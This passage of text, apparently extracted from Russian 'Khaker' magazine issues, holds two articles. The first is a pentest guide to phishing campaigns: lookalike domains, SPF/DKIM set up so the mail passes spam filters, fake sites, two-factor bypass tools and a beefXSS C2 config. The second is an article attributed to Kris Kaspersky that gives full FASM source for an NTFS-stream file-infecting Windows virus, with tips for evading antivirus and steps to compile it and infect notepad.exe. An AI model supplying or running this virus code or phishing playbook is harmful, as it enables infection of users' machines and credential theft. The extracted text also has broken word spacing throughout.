 • с помощью тек ста письма и полей для ввода (например, на фишинговом
   сайте или в программе, имитирующей внут рикорпоративное ПО) зас‐
   тавить пользователя выдать конфиденциальную информацию, не вызвав
   при этом подозрений;
 • заставить пользователя ска чать файл (из письма, с сайта, торрента)
   и что‐то с ним сделать (например, запустить при ложение, открыть в Word
   документ и включить макросы), также не вызвав при этом подоз рений.
   Скачиваемый вредонос ный файл при этом может как эксплу атировать уяз‐
   вимости в системе пользователя, так и прос то быть стилером.

Для рассылки электронной почты необ ходимо как минимум наличие поч‐
тового сервера. На самом деле тут воз можно два варианта доставки писем
в сеть заказчика: изнутри и снаружи.
  Под доставкой изнутри подразумевается исполь зование почтового сер‐
вера в тестируемой сети (при удачной его компро метации) — но опустим этот
вариант, так как специальной подготовки там практически не тре буется,
по сравнению с рассылкой сна ружи. Решив, что почтовый сервер заказчика
скомпрометировать не получится, мы при ходим к выводу, что нужно либо
использовать готовые почтовые сервисы, либо поднимать собственный поч‐
товый сервер и покупать свой домен. Готовые почтовые сервисы плохи тем,
что сообщения с них не вну шают доверия, к тому же ИТ/ИБ‐служба заказчика
может не согласиться ослаблять системы защиты для доменов этих служб,
поскольку ими поль зуется не только тес тировщик.
  А вот если поднять сервер на своем домене, который очень сильно
напоминает домен заказчика, это убьет сра зу обо их зайцев: у невниматель‐
ных пользователей это может снизить бдительность до нуля, да и пользовать‐
ся доменом будем только мы. При этом важно помнить, что технологии
не  стоят на месте и для подобных вещей давным‐давно придуманы
антиспам‐фильтры.
   Итак, на данный момент мы уста новили для себя следующие цели:
 • решить, будут ли использоваться вредоносные файлы, или мы привлечем
   только фишинговые поделки (можно и совместить оба метода). В соот‐
   ветствии с выбранным подходом нужно придумать текст письма, мотиви‐
  рующий пользователя совершить нужные нам действия;
 • решить, каким образом дос тавлять вредоносные файлы и как выполнять
   фишинг;
 • подготовить локальную инфраструктуру для отправки сообщений;
 • снизить вероятность попадания наших писем в спам;
 • наконец, произвести рассылку.


             INFO

                   В статье упоминаются некоторые основополага‐
                  ющие   для   социальной  инженерии   вещи,
                      но информация не претен дует на полноту. Если
                      ты только начинаешь свой путь, то почитай статьи
                        в журнале по соответствующему зап росу в поиске
                         (но не ограничивайся только ими). Для новичков
                      особенно  хочу  отметить  статью  «Социальная
                     инженерия как часть тестирования на проник‐
                      новение».



ЭТАП 1. ИЗГОТАВЛИВАЕМ СТРЕЛЫ
После того как мы определились с атакой, необ ходимо подготовить нужные
для этого инструменты: очертить круг получа телей, при думать заголовок
письма, его текст и способ, при помощи которого мы будем закрепляться
в сети.
  Немалую роль  в выборе нужного инстру мента играет информация,
полученная на этапе разведки, — прежде всего список email‐адре сов сот‐
рудников, используемые ими системы защиты (для тестирования детекта
вредоносных вложений) и различные конфигурации инфраструктуры. Пос‐
ледние два аспекта могут помочь как минимум в следующих случаях:
 • тестирование может проводиться при минимальном содействии со сто‐
  роны ИТ‐ и ИБ‐персонала: это означает, что в конфигурации сис тем
   защиты не будут вносить исключения для наших писем. Информация
  о конфигурации систем защиты поможет нам узнать, какую стратегию выб‐
   рать и как правильно ей следовать;
 • в случае с доставкой вредонос ных вложений, которые, как ты догады‐
  ваешься, могут активно детектироваться теми самыми системами защиты,
   нужно знать хотя бы наз вания исполь зуемого ПО. Это уже поможет в тес‐
   тировании вредоноса и, как следствие, повысит шансы на успех.

Из списка email‐адресов надо исключить некото рых пользователей, нап‐
ример выбрав только определенный отдел (или несколько, но разделив
при этом фишинговую ата ку на этапы с индивиду альным под ходом для каж‐
дой группы получателей). Лучше исклю чить из списка ИТ‐ и ИБ‐персонал,
который с гораздо боль шей вероятностью распознает фишинговую рас сылку
(потому что эти люди технически подкованы) и своевременно предупредит
своих коллег. Также неп лохо будет персонализировать письмо, то есть
писать не обезличенно, а в стиле «Доб рый день, %username%». Рассылку
и персонализацию, конечно, надо будет автоматизировать, но об этом позже,
сейчас для будущей автоматизации мы просто составим общий шаблон пись‐
ма, в который потом подста вим имя пользователя, его адрес и прочие зна‐
чения.
  Затем нужно соб рать информа цию,  которая придаст письму  прав‐
доподобность. Например, узнать, проводятся ли в фирме какие‐нибудь внут‐
рикорпоративные мероприятия, или уточнить, с какими клиентами и партне‐
рами компания заказчика активно ведет перепис ку. В общем, те вещи,
с которыми можно связать тему и текст пись ма.
  После этого в ход идет информа ция, используемая для «шлифовки» пись‐
ма, — стиль переписки сотрудников, их корпоративная подпись и прочее.
Надо хвататься за любые сведения — так повысятся шансы на успех.
  А теперь важный момент: «шлифовка» письма нужна также и для того, что‐
бы сообщение меньше всего походило на спам. Спам‐фильтры используют
несколько показателей, чтобы сос тавить рей тинг пись ма. Сре ди прочего ана‐
лизируется и содержимое, и заголо вок. В основе алгоритма анализа содер‐
жимого могут исполь зовать ся разные, обычно комбинированные способы
(искусственный интеллект, жалобы от пользователей, собственные иссле‐
дования сотрудников почтового сервиса), но цель одна — определить веро‐
ятность, что сообщение принадлежит к вредонос ной рассылке.
   Крупные почтовые сервисы привлекают сложные ноу‐хау. Тестируемая
нами компания также может использовать коммерческие спам‐фильтры (о
настройке своего филь тра можно про читать, например, в статье про Email
Security Gateway). О подробностях работы антиспа ма у атакующе го часто
не будет никакой информа ции (в том числе — что он есть), поэтому стоит
соблюдать общие советы, как преодолеть спам‐фильтры:
 • гугли каждый раз список слов, час то встречающихся в спаме, потому что
   такие списки могут обновлять ся. Старайся не использовать эти слова
   в письме;
 • не злоупотребляй знаками препина ния (особенно идущими подряд);
 • не  пытайся  сделать  письмо  «раз нообразным», ины ми  словами —
   не используй разные сочетания размеров шрифта, цветов текста, стилей,
   слова, написанные в вер хнем регистре. Короче, старайся не украшать
   текст подобными выкрутасами без необходимос ти (исключением может
   быть, например, соответствие стилю корпоративной переписки);
 • не используй множество ссылок в пись ме, особенно на разные домены;
 • если встав ляешь ссылки, то не укорачивай их;
 • не добавляй слишком много изображений без необ ходимости;
 • письмо не должно быть пус тым и содержать толь ко вложения;
 • не используй leet‐стилистику текста;
 • если письмо вклю чает ссылки на сайт с вредоносным содержимым, то
   не прикрепляй ссылку на файл напрямую — сис темы могут оповестить ИТ‐
   или ИБ‐персонал, и атака сойдет на нет при должной реакции этих сот‐
   рудников;
 • хорошенько подумай перед тем, как вкладывать вредонос напрямую
   в письмо. Даже если он будет запако ван в архив и зашиф рован, это не
   гарантирует успех — в системах защиты может использоваться политика
   не пропускать  входящие зашифрованные файлы  с  чужих  почтовых
   доменов;
 • старайся не вкладывать в сообщения файлы больших размеров. Размер
   самого письма тоже должен быть небольшой;
 • мониторь требования популярных почтовых сервисов к рас сылкам. Нап‐
   ример, требования Мейла, Яндекса и Гуг ла;
 • подумай, насколько правдоподобным показалось бы это письмо, если бы
   оно пришло тебе;
 • не лишним будет воспользоваться сервисами наподобие mail‐tester, что‐
  бы проверить рейтинг пись ма.


ЭТАП 2. ИЗГОТАВЛИВАЕМ ЛУК
Вы бираем домен
С этим все просто: придумываем домен, максималь но похожий на домен тес‐
тируемой компании. В идеале отличие должно заключаться в одном символе
и замена должна быть малозаметной (например, замена o на 0 или замена
на ту же букву с другим кодом в кодировке Unicode). Если с фантазией туго
или у тебя нет времени даже обду мать имя домена, то можешь использовать
инструмент  catphish.  Заодно  он  проверит  дос тупность  генерируемых
доменов. После выбора домена и проверки его дос тупности надо купить его
у твоего любимого регистра тора. В настройках зоны необходимо добавить
MX‐запись (например, mx.yourdomain.com), а для нее, в свою оче редь, A‐
запись с указанием IPv4‐адреса, на котором в будущем мы поднимем поч‐
товый сервер. Также нужно добавить PTR‐запись, потому что ее отсутствие
может снизить рейтинг письма.


Поч товый сервер
Следующая цель — подготовка инфраструктуры для рассылки, то есть поч‐
тового сервера. Если быть точнее, то необходим как минимум SMTP‐сервер
для отправки писем. Также неплохо бы завес ти POP3/IMAP‐сервер на слу чай,
если придется общаться с пользователями дальше. Можешь поднять свой
любимый почтовик, но чаще всего для этих целей используют связки exim +
dovecot или postﬁx + dovecot. Это отличный выбор, если ты ни разу не настра‐
ивал свой сервер, потому что в Сети мож но найти кучу статей по настройке
этих серверов и решению проблем, возника ющих при их конфигурировании.
Сейчас же поговорим о том, как с готовым почтовым сервером не угодить
в спам.
  Помимо содержимого письма, есть и другие индикаторы добропорядоч‐
ности почтовых сооб щений. Ана лиз содержимого может принести какие‐то
результаты, но антиспам‐филь тры считают, что сам адми нистратор почтового
сервера также дол жен доказать легальность отсылаемых писем. Можно усы‐
пить бдительность фильтров, добавив пару ресурсных DNS‐записей: SPF
и DKIM.


SPF
SPF (Sender Policy Framework) — это метод, поз воляющий адми нистраторам
составлять белые списки IP‐адресов, с которых отправляется почта. Если
вспомнить принципы работы почты и SMTP, то выясняется, что отправитель
почты в поле MAIL FROM может ука зать любой домен (то есть устроить спу‐
финг). На борьбу с этим и нап равлен SPF.
   Суть метода состоит в  том,  что любой желающий может получить
информацию, связанную с доменом отправителя и содержащую указания
о том, кто может отсылать почту, — для этих целей прекрасно подходит DNS.
Конфигурирование SPF выполняется следующим образом: админис тратор
почтового сервера добавляет в нас тройках DNS‐зоны ресурсную TXT‐запись
(к TXT‐записи опциональ но также можно добавить ресурсную SPF‐запись,
придуманную специально для SPF) в определенном формате, где написано,
какие IP‐адреса могут использовать домен, свя занный с этой записью. После
этого принимающий почтовый сервер сверяет IP‐адрес отправителя с адре‐
сами, указанными в ресурсной записи, и в случае успеха передает письмо
дальше. При этом в заголовках пись ма можно будет увидеть при мерно такой
заголовок:


Authentication‐results: spf=pass

При неудачной проверке пись мо обычно попада ет в спам, потому что несо‐
ответствие SPF — весомый аргумент за понижение рей тинга сообщения. Все
подробности про SPF и его синтаксис можно почитать в официальном
документе RFC 7208. Для наших же целей дос таточно использовать самую
простую запись, в которой мы разрешаем определенные IP‐адреса и зап‐
рещаем все остальные.


@yourdomain TXT "v=spf1 ip4:1.2.3.4 ‐all"` или `yourdomain.com TXT
"v=spf1 ip4:1.2.3.4 ~all"

 • @yourdomain — указание нижнего домена отно сительно текущей зоны
   (то есть если запись добавляется в зону example.ru , то относиться она
   будет к yourdomain.example.ru ). На некото рых хостингах знак @ не ука‐
   зывается — изучай синтаксис в справке хос тинга;
 • v=spf1 — версия SPF, на данный момент используется только первая;
 • ip4 — указание IP‐адреса хоста для белого списка (прошу заметить:
  именно ip4, а не ipv4);
 • all — указание на то, чтобы отклонить пись мо. В синтаксисе SPF есть
   два способа это сделать: тильда указывает на «мягкое» отклонение пись‐
  ма (письмо дой дет, но попадет в спам), а дефис (как в примере) на «жес‐
   ткое» отклонение.


DKIM
DKIM (DomainKeys Identiﬁed Mail) — это метод, помогающий аутентифици‐
ровать электронные сооб щения. Если быть более точным, то DKIM поз воляет
серверу‐получателю убедиться, что письмо было отправлено действительно
с того домена, который ука зан в заголовках. Работа ет метод на асимметрич‐
ной криптографии, и его суть в том, что электронное сообщение подписыва‐
ется ЭЦП, открытый ключ должен быть связан с доменом отправителя и быть
доступным для всех желающих. Для этих целей тоже идеально подходит DNS.
А принимающий сервер затем будет проверять ЭЦП с помощью откры того
клю ча. На картинке ниже показа на схема работы DKIM.





                       Схема работы DKIM

На этой схеме происходит следующее.
 1. Перед началом работы на почтовом сервере генерируются открытый
   и закрытый ключи. Закрытый, естественно, сохраня ется в надежном месте,
   а открытый ключ располагается  в ресурсной TXT‐записи почтового
   домена.
 2. На сервере настраивается ПО для подписи сообщения при каждой его
   отправке (можно исполь зовать программу с открытыми исходниками—
  OpenDKIM).
 3. Каждый раз, когда отправляется сооб щение, с помощью закрытого ключа
   оно подписывается. То есть создается DKIM‐подпись, которая вставляет‐
   ся в заголовок сооб щения (высчитыва ются хеши от заголовков и тела
   сообщения, которые потом шифруются асимметричным алгоритмом шиф‐
   рования).
 4. Принимающий сервер с помощью откры того клю ча проверя ет ЭЦП с пре‐
   дыдущего шага, и если все окей, то, скорее всего, сообщение дойдет
   до получателя.

Эта упрощенная схема приведена, просто что бы понимать общий процесс,
за подробностями можешь сно ва обратиться к документу RFC 6376.
   Если все прошло успешно, то получа ющая сторона в значении заголовка
Authenication‐results среди прочего увидит строку dkim=pass.
  На первый взгляд кажет ся, что для наших задач хватило бы DKIM, но это
не так, поскольку SPF и DKIM преследу ют немного разные цели. SPF говорит
проверяющей стороне о том, каким IP‐адресам раз решено отсы лать сооб‐
щения, используя указанный домен, а DKIM уведомляет, что сообщение
не было изменено во время переда чи.
   Если настраивать сервер на своем выделен ном IP‐адресе, то проблем
нет, но при настройке почтового сервера на VDS есть опре деленные нюан‐
сы — о них можно почитать в статье про настройку SPF/DKIM (там же можно
узнать и про подробнос ти настройки связ ки Postﬁx + OpenDKIM). Еще один
момент, который стоит обязательно учесть: длина откры того ключа может
оказаться слишком боль шой, а хостинг‐провайдеры могут запрещать добав‐
ление слишком длинных ресурсных записей. На этот случай OpenDKIM
любезно разбивает ключ на несколько частей, заключенных в кавычки.
   Есть как минимум два спо соба обойти эту проблему: добавить нес колько
последовательных TXT‐записей или одну TXT‐запись, раз битую на час ти.
В последнем случае символом разбиения служит перенос строки. OpenDKIM
весь ключ помещает в круглые скоб ки, а каждую его часть оборачивает
в двойные кавычки и раз деляет пробелом. Таким образом, надо удалить
кавычки и круглые скоб ки (некото рые хос тинг‐про вайдеры допускают наличие
в DNS‐записях круглых скобок), затем весь оставшийся текст с переносами
строки поместить в TXT‐запись.
   Главное — после добавления всех нас троек не забудь проверить кор рек‐
тность добав ленных записей, осо бенно в случае с многострочным откры тым
клю чом DKIM.


Фишин говый сайт
Фишинговый  сайт  бывает  полезен,  когда  нужно  получить  данные
от какого‐либо ресурса в Сети. Некото рые юзеры склонны использовать один
пароль для разных целей, поэто му после успешного фишинга имеет смысл
проверить остальные сервисы компании с помощью полученных учетных
записей. Фишинговый сайт должен быть мало отличим от настоящего. Может
потребоваться также обойти двухфакторную аутентификацию — при этом
удобно применять инструменты Modlishka или Evilginx.
   Если ты решил исполь зовать в своей фишин говой кампании веб‐сайт, то
тут также есть пара нюансов.
  Прежде всего, нужно обеспечить поддержку HTTPS — добавить самопод‐
писанный сертификат на сайт, поскольку мно гие пользователи склонны
верить замочку в браузер ной строке, не вдаваясь в технические подробности
реализации этой функции. К тому же при работе через HTTP браузер будет
недвусмысленно  намекать,  что  переда вать  конфиденциальные  данные
в открытом виде опасно, и пусть даже предупреждения о фишинговом сайте
тут нет, это может повысить тревожность и бдительность пользователей,
а нам это совершенно ни к чему. В выпуске сертифика та ничего сложного нет,
а подробности можно прочитать, например, в статье про letsencrypt.
   Есть компании, предлагающие так называ емую защиту бренда. В эту услу‐
гу обычно входит защита от фишинга, то есть защита компании от действий,
при которых может пострадать ее репутация. Обычно под этим подразуме‐
вается:
 • мониторинг веб‐ресурсов компании на предмет дефейса или  угона
  доменного имени;
 • мониторинг сети компании на предмет фишинговых рас сылок;
 • мониторинг доменов, силь но похожих на домены компании, и всего, что
  может быть связано с этими похожими домена ми (в первую оче редь ищут
   веб‐сайты и почтовые серверы);
 • мониторинг продуктов компании, которые могут позволить злоумыш‐
   ленникам действовать от ее имени (использование динамически подгру‐
  жаемых изображений, JS‐библиотек и про чего).

Подобные компании также предлагают для бра узеров расширения, которые
неоднозначно намекают пользователю об опас ности того или иного сайта.
В MS Edge, например, совместная работа разных веб‐сервисов и фильтра
SmartScreen может привес ти к тому, что на определенный сайт, считающийся
«потенциально фишинговым», будет невоз можно зайти.





    Блокировка потенциально фишингового сайта в браузере MS Edge





     Блокировка потенциально фишингового сайта в браузере Chrome

Слово «потенциально» здесь используется потому, что от подобных блокиро‐
вок могут пострадать и вполне легитимные сай ты.
   Такие расширения выпус каются для раз ных бра узе ров, но, помимо этого,
и сами браузеры (например, Firefox) имеют механиз мы защиты, основанные
на отзывах и рейтингах. Не исключено, что будут совершенствоваться
и использоваться разные сервисы для мониторинга фишинговой деятельнос‐
ти.
   Чтобы обойти все эти ловушки, придерживайся следующих правил:
 • при использовании пос торонних ресурсов на фишинговом сайте лучше
   скачай их и отдавай ста тически с веб‐сервера, потому что обращение
   к сторонним ресурсам может мониториться. Особенно важно это делать,
   если на фишинговом сайте используются ресурсы, связанные с популяр‐
  ными браузерами, — в интересах владельцев браузеров отслеживать
   подобные вещи;
 • не запускай фишинговый сайт слишком рано, сервисы защиты бренда
   могут активно за этим следить.


Отладка полез ной нагрузки
Если ты решил подготовить вредоносы для закрепления в сети, то тут тоже
есть несколько важных нюансов:
 • тестируй малварь в изолированной сети;
 • при тестировании реакции систем защиты обру бай выход в интернет —
   иначе сигнатуры твоего вредоноса быс тро ока жутся в базах антивирусов;
 • не загружай образцы на публичные сервисы вроде VirusTotal;
 • в качестве метода доставки лучше использовать веб‐сайт, поскольку
   передача подобных вещей по почте в открытом виде приведет к стоп‐
   роцентной неудаче, а зашифрованный архив могут не пропус тить сис темы
   защиты в сети заказчика.

Конечно, это не дает стоп роцентной гарантии успеха, потому что политики
систем защиты могут быть нас троены черес чур параноидально, но как
минимум увеличит вероятность, что твое пись мо не будет заблокировано
или отправлено в спам.


ЭТАП 3. НАТЯГИВАЕМ ТЕТИВУ
Итак, мы составили письмо, подготовили список рас сылки, подняли и нас тро‐
или сервер. Что дальше?
   Теперь  надо  это  дело  автоматизировать. Можно  написать  скрипт
для командной строки, который будет исполь зовать CLI нашего почтового
сервера для отправки писем, но это сродни изоб ретению велосипеда. Лучше
использовать популярные инс трументы автоматизации рас сылок. Среди бес‐
платных решений самое популярное — Gophish. Он помогает не только авто‐
матизировать процесс с помощью встроенных скриптов рассылки и шаб‐
лонизатора для автоматичес кой подстановки текста в электронное сооб‐
щение, но и собирать ста тистику.
  Среди отсле живаемых метрик — открытие письма (в сообщение встав‐
ляется невидимое изоб ражение с атрибутом src, ука зывающим на специаль‐
ный скрипт на веб‐сервере), открытие ссылки. В «Хакере» уже выходила
статья про настрой ку это го инс трумента, там нет ничего сложного. Gophish
предназначен для рас сылки почты через  сторонний почтовый сервер,
который нужно указать среди параметров, но при этом он не позволяет читать
присланную почту (иначе это была бы какая‐то смесь почтового недоклиента
и фишингового фреймворка).
   Казалось бы, все уже готово. Но если ты решил использовать фишинговый
сайт, то остался последний штрих, чтобы довести дело до ума, — постэксплу‐
атация в браузере пользователя. Иногда это может дать какую‐то информа‐
цию, особенно если у пользователей уста ревшие версии браузе ров.
  Самое популярное (и бес платное) решение — это beefXSS, browser ex‐
ploitation framework (фреймворк для эксплуата ции бра узе ра). Суть его работы
проста: ты добавляешь на свой фишин говый сайт скрипт, который будет
соединяться с поднятым заранее командным сервером. Если все пройдет
успешно, то на командном сервере через веб‐интерфейс в панели админис‐
тратора ты сможешь совершить различные дей ствия, начиная от простой
разведки (например, узнать открытые порты на хос те клиента и на соседних
хостах, выяснить IP‐адреса хос та и его соседей) до экс плуатации уязвимос‐
тей в браузере. В «Хакере» также выходил ма нуал по работе с beefXSS.
   Стоит учесть пару важных моментов.
   Во‐первых, если фишинговый сайт работа ет через HTTPS, а командный
сервер beef поднят на HTTP, то современные бра узеры не дадут подгрузить
на HTTPS‐сайт скрипт по протоколу HTTP. Поэтому надо будет сначала вклю‐
чить в конфигурационном файле config.yaml поддержку HTTPS и указать
будущее наименование ключа и сертифика та. Таким образом, в конфиге дол‐
жны быть примерно такие строки:


https:
    enable: true
    key: "your_key.pem"
    cert: "your_cert.pem"

Во‐вторых, для командного сервера beef нужно выделить домен (можно под‐
домен для уже купленного домена) и сно ва через letsencrypt выпустить сер‐
тификат. Ключ и сертификат при этом нуж но будет поместить в папку с beef.


ЗАКЛЮЧЕНИЕ
Хотя фишинговая рассылка не новый и не единственный метод исполь‐
зования социальной инженерии, она хорошо работает и применима прак‐
тически всегда. Но для успеха важ на каждая деталь, полученная на этапе OS‐
INT, — начиная от непосредственно самих email‐адресов и заканчивая при‐
нятым в компании стилем корпоративной переписки (как в прямом смысле —
оформление текста, так и в переносном — речевые обороты и подписи
в письмах).
   Если ты планируешь использовать свой IP‐адрес или домен после завер‐
шения тестирования, не забудь проверить их отсутс твие в DNSBL (DNS Black
Lists) — это еще один рас простра ненный спо соб борьбы со спамом. Если
собираешься разворачивать выделен ный сервер, нужно также заранее про‐
верить свой VDS на профпригодность с помощью этих спис ков.
   Ну а в остальном, как говорится, все зависит от тебя. Доверчивые и не
слишком внимательные пользователи — не мамонты, они не вымрут, а потому
пентестеры  с  навыками социальных инженеров  отыщут  слабое  зве но
в любом, даже самом надежном коллективе.
ВЗЛОМ

 ВИРУС
      WINDOWS   ДЛЯ



       СОЗДАЕМ ПРОСТЕЙШУЮ
     ВРЕДОНОСНУЮ ПРОГРАММУ
          НА АССЕМБЛЕРЕ





Конструирование вирусов — отличный сти‐
мул  изучать ассемблер. И  хотя  вирус,
в  принципе, можно  написать  и  на  С,
это будет как‐то не по‐хакерски и вообще         ИзвестныйКрис Касперскироссийский
неправильно. Следующий далее текст —        редакторхакер. ЛегендаВЗЛОМа.][,Такжеex‐
заметка Криса Касперски, которая раньше       известенмыщъх,подnezumiпсевдонимами(яп. 鼠,
                                                                                  мышь), n2k, elraton, souriz,
не публиковалась в «Хакере». Из нее ты           tikus, muss, farah, jardon,
                                                                                      KPNC.
узнаешь,  как  создаются  вирусы  и  как
написать  простой  вирус  для  Windows
при помощи FASM.


ПАРА ВСТУПИТЕЛЬНЫХ СЛОВ
Итак, давай погрузимся в мрачный лабиринт кибернетического мира, ряды
обитателей которого скоро пополнятся еще одним зловредным созданием.
Внедрение вируса в исполня емый файл в общем слу чае достаточно сложный
и мучительный процесс. Как минимум для этого требуется изучить формат
PE‐файла и освоить десятки API‐функций. Но ведь такими темпами мы
не напишем вирус и за сезон, а хочется пря мо здесь и сей час. Но хакеры мы
или нет? Файловая система NTFS (основная файловая система Windows)
содержит потоки данных (streams), называ емые также атрибутами. Внутри
одного файла может существовать нес колько независимых потоков данных.


           WARNING

                      Вся информация в этой статье предоставлена
                      исключительно   в   ознакомительных   целях.
                    Ни редакция, ни автор не несут ответственности
                        за любой возможный вред, причиненный матери‐
                       алами дан ной статьи. Помни, что неправомерный
                      доступ  к  компьютерной информации  и  рас‐
                       пространение вредоносного ПО влекут ответс‐
                        твенность согласно статьям 272 и 273 УК РФ.





  Файловая система NTFS поддерживает несколько потоков в рамках
  одного файла

Имя потока отде ляется от имени файла знаком двоеточия (:), например my_‐
file:stream. Основное тело файла хра нится в безымянном потоке, но мы
также можем создавать и свои потоки. Заходим в FAR Manager, нажимаем
клавиатурную комбинацию Shift  +  F4, вводим с клавиатуры имя фай ла
и потока данных, например xxx:yyy, и затем вво дим какой‐нибудь текст.
Выходим из редактора и видим файл нулевой длины с именем xxx.
  Почему же файл имеет нулевую длину? А где же только что введенный
нами текст? Нажмем клавишу <F4> и… действительно не увидим никакого
текста. Однако ничего удивительного в этом нет. Если не указать имя потока,
то файловая система отоб разит основной поток, а он в данном случае пуст.
Размер остальных потоков не отобража ется, и дотянуться до их содержимого
можно, только указав имя потока явно. Таким обра зом, чтобы увидеть текст,
необходимо ввести сле дующую команду: more < xxx:yyy.
   Будем мыслить так: раз соз дание дополнитель ных потоков не изменяет
видимых размеров файла, то пребывание в нем пос тороннего кода, скорее
всего, останется незамеченным. Тем не менее, чтобы передать управле ние
на свой поток, необ ходимо модифицировать основной поток. Контрольная
сумма при этом неизбежно изменится, что наверняка не понравится анти‐
вирусным программам. Методы обмана антивирусных программ мы рассмот‐
рим в дальнейшем, а пока определимся со стра теги ей внедрения.


АЛГОРИТМ РАБОТЫ ВИРУСА
Закрой руководство по формату исполняемых файлов (Portable Executable,
PE). Для решения поставленной задачи оно нам не понадобится. Действо‐
вать будем  так: создаем внутри инфицируемого файла дополнительный
поток, копируем туда основное тело файла, а на освободившееся место
записываем наш код, который делает свое черное дело и передает управле‐
ние основному телу вируса.
  Работать такой вирус будет только на Windows и только под NTFS.
На работу с другими файловыми системами он изначально не рассчитан.
Например, на разделах FAT оригинальное содержимое заражаемого файла
будет попросту утеряно. То же самое произойдет, если упаковать файл
с помощью ZIP или любого дру гого архи ватора, не поддерживающего фай‐
ловых потоков.
  В качестве примера архиватора, поддерживающего файловые потоки,
можно привести WinRAR. Вкладка «Дополнительно» в диалоговом окне «Имя
и параметры архива» содержит группу опций NTFS. В составе этой группы
опций есть флажок «Сохранять файловые потоки». Установи эту опцию, если
при упаков ке файлов, содержащих нес колько потоков, требуется сохранить
их все.





  Архиватор RAR способен сохранять файловые потоки в процес се архи‐
  вации

Теперь настал момент поговорить об антивирусных программах. Внедрить
вирусное тело в файл — это всего лишь половина задачи, и притом самая
простая. Теперь создатель вируса должен продумать, как защитить свое тво‐
рение от всевозможных антивиру сов. Эта задача не так сложна, как кажется
на первый взгляд. Достаточно заблокировать файл сразу же после запуска
и удерживать его в этом сос тоянии в течение всего сеанса работы с Windows
вплоть до перезагрузки. Антивиру сы прос то не смогут открыть файл, а значит,
не смогут обнаружить и факт его изменения. Существует множество путей
блокировки —  от CreateFile  со сброшенным флагом  dwSharedMode
до LockFile/LockFileEx.
  Основная ошибка большинс тва вирусов сос тоит в том, что, однажды внед‐
рившись в файл, они сидят и покорно ждут, пока антивирус не обнаружит их
и не удалит. А ведь сканиро вание современных винчестеров занимает зна‐
чительное время, зачас тую оно рас тягива ется на многие часы. В каждый
момент времени антивирус проверя ет всего один файл, поэтому, если вирус
ведет кочевую жизнь, мигрируя от одного фай ла к другому, вероятность, что
его обнаружат, стремительно уменьшается.
  Мы будем действовать так: внедряемся в файл, ждем 30 секунд, удаляем
свое тело из файла, тут же внедряясь в дру гой. Чем короче период ожидания,
тем выше шансы вируса остаться незамеченным, но и тем выше дис ковая
активность. А регулярные мигания красной лампочки без видимых при чин
сразу же насторожат опытных пользователей, поэтому приходится хитрить.
  Например, можно вести монито ринг дисковой активности и заражать
только  тогда,  когда  происходит  обра щение  к  какому‐нибудь  файлу.
В решении этой задачи нам поможет специализированное ПО, например
монитор процессов Procmon.


ПРОГРАММНЫЙ КОД ВИРУСА
Естественные языки с описанием компь ютерных алгоритмов практически
никогда не справляются. Уж слишком эти язы ки неоднозначны и внутренне
противоречивы. Поэто му, во избежание недора зумений, продуб лируем опи‐
сание алгоритма на языке ассемблера. Вот исходный код нашего вируса.


include 'c:\fasm\INCLUDE\WIN32AX.INC'


.data
    foo db "foo",0        ; Имя временного файла
    code_name db ":bar",0 ; Имя потока, в котором будет...
    code_name_end:        ; ...сохранено основное тело


    ; Различные текстовые строки, которые выводит вирус
    aInfected db "infected",0
    aHello db "Hello, you are hacked"


    ; Различные буфера для служебных целей
    buf rb 1000
    xxx rb 1000


.code


start:
    ; Удаляем временный файл
    push foo
    call [DeleteFile]


    ; Определяем наше имя
    push 1000
    push buf
    push 0
    call [GetModuleFileName]


    ; Считываем командную строку
    ; Ключ filename — заразить
    call [GetCommandLine]
    mov ebp, eax
    xor ebx, ebx
    mov ecx, 202A2D2Dh ;


rool:
    cmp [eax], ecx ; это '‐‐*'?
    jz infect
    inc eax
    cmp [eax], ebx ; Конец командной строки?
    jnz rool


    ; Выводим диагностическое сообщение,
    ; подтверждая свое присутствие в файле
    push 0
    push aInfected
    push aHello
    push 0
    call [MessageBox]


    ; Добавляем к своему имени имя потока NTFS
    mov esi, code_name
    mov edi, buf
    mov ecx, 100; сode_name_end ‐ code_name
    xor eax,eax
    repne scasb
    dec edi
    rep movsb


    ; Запускаем поток NTFS на выполнение
    push xxx
    push xxx
    push eax
    push eax
    push eax
    push eax
    push eax
    push eax
    push ebp
    push buf
    call [CreateProcess]
    jmp go2exit ; Выходим из вируса


infect:
    ; Устанавливаем eax на первый символ имени файла‐жертвы
    ; (далее по тексту dst)
    add eax, 4
    xchg eax, ebp
    xor eax,eax
    inc eax


    ; Здесь можно вставить проверку dst на заражение
    ; Переименовываем dst в foo
    push foo
    push ebp
    call [MoveFile]


    ; Копируем в foo основной поток dst
    push eax
    push ebp
    push buf
    call [CopyFile]


    ; Добавляем к своему имени имя потока NTFS
    mov esi, ebp
    mov edi, buf


copy_rool:
    lodsb
    stosb
    test al,al
    jnz copy_rool
    mov esi, code_name
    dec edi


copy_rool2:
    lodsb
    stosb
    test al,al
    jnz copy_rool2


    ; Копируем foo в dst:bar
    push eax
    push buf
    push foo
    call [CopyFile]


    ; Здесь не помешает добавить коррекцию длины заражаемого файла
    ; Удаляем foo
    push foo
    call [DeleteFile]


    ; Выводим диагностическое сообщение,
    ; подтверждающее успешность заражения файла
    push 0
    push aInfected
    push ebp
    push 0
    call [MessageBox]


    ; Выход из вируса


go2exit:
    push 0
    call [ExitProcess]


.end start


КОМПИЛЯЦИЯ И ТЕСТИРОВАНИЕ ВИРУСА
Для компиляции вирусного кода нам понадобится транслятор FASM, бесплат‐
ную Windows‐версию которого можно найти на сайте  ﬂatassembler.net.
Остальные трансляторы (MASM, TASM) тут непригодны, так как они исполь‐
зуют совсем другой ассемблерный синтаксис.
   Скачай последнюю версию FASM для Windows, распакуй архив и запусти
приложение fasmw.exe. Скопируй исходный код вируса в окошко программы
и выполни коман ды Run → Compile, а затем укажи, в какую папку сохранить
скомпилированный исполняемый файл.
  Запустим его на выполнение с опцией командной строки ‐‐*, впи сав пос‐
ле нее имя файла, который требуется заразить, например notepad.exe
(xcode.exe ‐‐* notepad.exe). Появление диалогового окна, показанного
на рисунке, говорит, что вирус внедрен в исполня емый файл блокнота.





     Диалоговое окно, свидетель ству ющее об успешном заражении

Если попытка заражения потерпела неудачу, первым делом необходимо убе‐
диться, что права доступа к файлу есть. Захватывать их самостоятельно наш
вирус не умеет. Во всяком случае — пока. Но вот настоящие вирусы, в отли‐
чие от нашего безобидного лабораторного создания, сделают это непремен‐
но.
   Теперь запусти зараженный файл notepad.exe на исполнение. В доказа‐
тельство своего существования вирус тут же выб расывает диалоговое окно,
